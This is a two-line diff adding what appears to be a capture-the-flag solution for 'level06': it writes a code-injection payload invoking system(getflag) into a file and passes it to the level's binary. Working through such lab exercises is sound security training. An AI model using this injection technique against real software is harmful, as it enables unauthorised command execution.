@@ -1,1 +1,2 @@
-
+Step 1: run "echo [x \{$\{system\(getflag\)\}\}] > /tmp/test"
+Step 2: run "./level06 /tmp/test"
